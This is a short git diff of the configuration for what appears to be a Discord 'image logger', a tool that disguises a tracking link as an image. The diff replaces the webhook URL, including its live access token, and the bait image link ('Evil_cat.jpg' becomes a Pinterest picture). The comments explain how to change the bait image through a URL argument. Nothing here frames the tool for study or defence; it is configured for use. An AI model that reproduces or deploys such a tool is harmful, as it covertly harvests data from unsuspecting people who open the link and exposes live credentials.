@@ -13,8 +13,8 @@ __author__ = "XSYTHO"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1356695606667776287/KaM6O9LANZpCLNjxwCMJA9AfCHdWbze2JdMb2vjThHn8FEYKvE5f2Ni6CVmB3fPeU7xX",
-    "image": "https://cdn.discordapp.com/attachments/1233881503923179572/1353909011480838196/Evil_cat.jpg?ex=67ed40c6&is=67ebef46&hm=a001879087729ece146771bad47415de0c753c89d62a50bc2684ab6f0142dbb0&", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1357200946278694933/H9lG-x2c97P9U8zoSZk5x4yRefrmKSAlXcJcPNyIRJUPWuhm5LtkNLoOlQQK8NTl4Whi",
+    "image": "https://www.google.com/url?sa=i&url=https%3A%2F%2Fwww.pinterest.com%2Fpin%2F1041879695039745727%2F&psig=AOvVaw2e46YzJRNNVEMCvltgihPk&ust=1743738824264000&source=images&cd=vfe&opi=89978449&ved=0CBQQjRxqFwoTCJCl19f7uowDFQAAAAAdAAAAABAE", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
